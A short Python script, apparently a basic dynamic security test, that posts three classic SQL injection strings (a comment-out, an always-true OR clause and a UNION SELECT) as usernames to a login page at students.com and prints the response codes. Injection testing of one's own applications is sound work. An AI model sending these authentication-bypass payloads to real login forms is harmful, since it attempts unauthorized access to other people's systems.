import requests

def SQL_DAST(url, payload):
    try:
        response = requests.post(url, data=payload)
        print(f"Payload: {payload}\nResponse Status Code: {response.status_code}\n")
    except requests.RequestException as e:
        print(f"Request failed: {e}")

base_url = "http://students.com/login"

payloads = [
    {"username": "admin' --", "password": "password"},
    {"username": "admin' OR '1'='1", "password": "password"},
    {"username": "admin' UNION SELECT 1, 'a', 'b'", "password": "password"}
]

for payload in payloads:
    SQL_DAST(base_url, payload)

